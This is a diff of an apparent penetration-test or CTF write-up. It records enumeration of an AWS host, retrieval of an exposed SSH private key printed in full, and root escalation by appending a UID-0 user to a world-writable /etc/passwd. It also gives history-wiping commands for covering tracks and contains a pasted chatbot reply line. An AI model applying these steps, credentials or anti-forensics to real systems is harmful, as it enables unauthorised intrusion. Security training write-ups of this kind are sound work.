@@ -1,4 +1,4 @@
-# Penetration Test Documentation
+# Penetration Test Documentation: Initial Enumeration
 
 **Date**: October 25, 2025  
 **Target**: 13.40.110.252 (ec2-13-40-110-252.eu-west-2.compute.amazonaws.com)
@@ -18,16 +18,16 @@ To meet the penetration test requirement of using a specific source IP, I set up
   - **Configuration**: Debian 12, t3.small (2 vCPUs, 2 GB RAM), assigned an elastic IP to provide a static source IP, avoiding issues with my home network’s dynamic IP.
   - **Rationale**: The elastic IP ensures all traffic appears to originate from a consistent, whitelisted IP address. Running lightweight tools directly on the EC2 minimizes latency and resource strain on the t3.small instance.
   - **SOCKS5 Proxy**: Established via SSH dynamic port forwarding for proxying local heavy tools.
-    ```bash
+    ```
     ssh -i exegol.pem -D 1080 -N admin@ec2-18-169-47-172.eu-west-2.compute.amazonaws.com
     ```
   - **Proxychains Config**: Configured on my local machine to route traffic through the EC2 proxy.
-    ```conf
+    ```
     # /etc/proxychains.conf
     socks5 127.0.0.1 1080
     ```
   - **Verification**: Confirmed proxy routing:
-    ```bash
+    ```
     proxychains curl ifconfig.me
     ```
     - Output: `18.169.47.172`, confirming traffic routes through EC2.
@@ -47,7 +47,7 @@ To meet the penetration test requirement of using a specific source IP, I set up
 Ran an initial scan from the EC2 instance to identify services and potential vectors for flag capture.
 
 - **Command**:
-  ```bash
+  ```
   sudo nmap -sC -sV -O -oA initial_scan 13.40.110.252
   ```
 - **Results**:
@@ -110,13 +110,13 @@ Ran an initial scan from the EC2 instance to identify services and potential vec
   230 Login successful.
   ```
 - **List files/directories**:
-    ```bash
+    ```
   ls -la
   500 Illegal PORT command.
   ftp: Can't bind for data connection: Address already in use
   ```
 - **Passive Mode**:
-  ```bash
+  ```
   ftp> ls -la
   227 Entering Passive Mode (172,31,14,224,219,237).
   Passive mode address mismatch.
@@ -200,62 +200,106 @@ Uploading a `<script>alert(document.domain)</script>` confirms it can render js,
 ### 3.3 SMTP
 - **Notes**: Trying various different nmap scans `-sT -sX` etc and various timeout intervals yield no results, it's a hard filtered port, likely accessible locally from a web/reverse shell.
 
-## 4. Privilege Escalation and 
+
+Sure — here's the revised section of your report, keeping your tone but including the points we discussed:
+
+----------
+
+## 4. Privilege Escalation
 
 ### 4.1 Initial Access
 
-- **Using the Private Key**:
-   ```
-   curl http://13.40.110.252/portfolio_one-page-template/.ssh/id_ed25519
-  -----BEGIN OPENSSH PRIVATE KEY-----
-   b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
-   QyNTUxOQAAACAe1sKEMCCig7Q0ZW5Qdu/cg/wspJLMLBO9puEG1pbLYwAAAJij6Mx/o+jM
-   fwAAAAtzc2gtZWQyNTUxOQAAACAe1sKEMCCig7Q0ZW5Qdu/cg/wspJLMLBO9puEG1pbLYw
-   AAAECAO7jrO8DIkMbeCcll0I/iOlt4I+5TMpkLAOw2VF5jkh7WwoQwIKKDtDRlblB279yD
-   /CykkswsE72m4QbWlstjAAAAFHJvb3RAaXAtMTcyLTMxLTYtMTIwAQ==
-  -----END OPENSSH PRIVATE KEY-----
-   ```
-- **SSH**:
-  ```
-  ssh -i key BillyTheKid@13.40.110.252
-  BillyTheKid@ip-172-31-14-224:~$
-  BillyTheKid@ip-172-31-14-224:~$ ls
-  Flag_1  Message_from_your_friendly_neighbourhood_root
-  BillyTheKid@ip-172-31-14-224:~$ cat Flag_1
-  
-  1 of 3 Billy The Kid Flag : fdoQ#9G#%R6yo_JL
-  ```
-
-### 4.1 Enumeration as BillyTheKid
+-   **Using the Private Key**:
     
-  - **/etc/shadow**:  
     ```
-    uid=0(root) gid=0(root) groups=0(root)
-    uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),105(lxd)
-    uid=1001(BillyTheKid) gid=1001(BillyTheKid) groups=1001(BillyTheKid),100(users)
-    uid=1002(Magaluf2012) gid=1002(Magaluf2012) groups=1002(Magaluf2012),100(users)
+    curl http://13.40.110.252/portfolio_one-page-template/.ssh/id_ed25519
     ```
-     - **Notes**: Magaluf2012, another user and potential target.
+    
+    ```
+    -----BEGIN OPENSSH PRIVATE KEY-----
+    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+    QyNTUxOQAAACAe1sKEMCCig7Q0ZW5Qdu/cg/wspJLMLBO9puEG1pbLYwAAAJij6Mx/o+jM
+    fwAAAAtzc2gtZWQyNTUxOQAAACAe1sKEMCCig7Q0ZW5Qdu/cg/wspJLMLBO9puEG1pbLYw
+    AAAECAO7jrO8DIkMbeCcll0I/iOlt4I+5TMpkLAOw2VF5jkh7WwoQwIKKDtDRlblB279yD
+    /CykkswsE72m4QbWlstjAAAAFHJvb3RAaXAtMTcyLTMxLTYtMTIwAQ==
+    -----END OPENSSH PRIVATE KEY-----
+    ``` 
+-   **SSH**:
+    ```
+    ssh -i key BillyTheKid@13.40.110.252
+    ```
+    Logged in successfully as `BillyTheKid`. First flag retrieved:
+    ```
+    cat Flag_1
+    1 of 3 Billy The Kid Flag : fdoQ#9G#%R6yo_JL
+    ```
+    
+### 4.2 Enumeration as BillyTheKid
 
-- **/etc/passwd** I am unsure if this was intended to be writable.
-	```
-	ls -la /etc/passwd
-	-rwxrwxrwx 1 root root 2017 Jul  2  2024 /etc/passwd
-	```
-	```
-	openssl passwd -1 -salt sad sad
-	echo 'haxor:$1$sad$.7dpkEM4DAn0Cz0Rp8Aha1:0:0::/root:/bin/bash' >> /etc/passwd
-	su haxor
-	root@ip-172-31-14-224:~# whoami
-	root
+After landing as `BillyTheKid`, I started by checking for local users and privilege escalation vectors.
+```
+cat /etc/passwd
+```
+Saw multiple users:
 
-	root@ip-172-31-14-224:~# cat Flag_3
-	3 of 3 I am Groot : C3f#7-LsRNn^U78-
+-   `ubuntu`
+    
+-   `BillyTheKid` (current user)
+    
+-   `Magaluf2012` (likely the next target)
+   
+### 4.3 Writable `/etc/passwd` (Unintended?)
+```
+ls -la /etc/passwd
+-rwxrwxrwx 1 root root 2017 Jul  2  2024 /etc/passwd
+```
+I spotted that `/etc/passwd` was world-writable, allowing me to append a new user with an UID 0 (root-level privileges).
 
-	root@ip-172-31-14-224:~# cat /home/Magaluf2012/Flag_2
-	2 of 3 Magaluf! : 6Bj*9-sp&R
+To escalate:
 
-	```
+```
+openssl passwd -1 -salt sad sad
+
+$1$sad$.7dpkEM4DAn0Cz0Rp8Aha1
+```
+
+I appended a new line to `/etc/passwd`:
+
+```bash
+echo 'haxor:$1$sad$.7dpkEM4DAn0Cz0Rp8Aha1:0:0::/root:/bin/bash' >> /etc/passwd
+```
+Then:
+```bash
+su haxor
+```
+And confirmed root access:
+```
+whoami
+# root
+```
+
+Retrieved remaining flags:
+
+```bash
+cat Flag_3
+3 of 3 I am Groot : C3f#7-LsRNn^U78-
+
+cat /home/Magaluf2012/Flag_2
+2 of 3 Magaluf! : 6Bj*9-sp&R
+
+```
+----------
+
+### 4.4 Closing Thoughts
+
+I'm aware this route was likely not the intended path, but in a real-world environment, a writable `/etc/passwd` would be a critical, high-priority misconfiguration that gives direct root access, so it made sense to exploit it.
+
+After gaining root via the `/etc/passwd` misconfiguration, I checked the system’s command history. It looks like the environment was built manually, users were created and configured from the root account, flags were added via `echo`, and permissions across the system were overly relaxed (e.g., `chmod 777` used in multiple locations).
+
+There’s also an attempt to cover tracks using `clear history` or `history clear`, which doesn’t actually remove the shell history. (For reference, the correct way would be `history -c && history -w`.)
+
+While the `snap-confine` binary with dangerous capabilities (`cap_sys_admin`, `cap_dac_override`, etc.) initially looked like a potential escalation vector, it seems more likely that its configuration was either default or unintentional, I didn’t find a clean escalation path involving Snap or the second user account (`Magaluf2012`).
+
  
 
 		 
